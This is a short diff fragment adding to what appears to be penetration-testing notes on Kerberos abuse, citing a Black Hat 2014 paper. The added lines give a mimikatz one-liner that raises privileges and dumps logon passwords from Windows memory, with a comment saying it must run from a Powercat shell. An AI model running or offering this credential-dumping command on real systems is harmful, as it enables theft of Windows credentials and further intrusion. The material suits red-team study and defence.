@@ -25,6 +25,9 @@ Scenario:
 * From [Duckwall-Abusing-Microsoft-Kerberos](https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf)
 
 ```powershell
+# Powercat Shell must run mimikatz one-liner
+mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"
+
 mimekatz# 
 privilege::debug
 
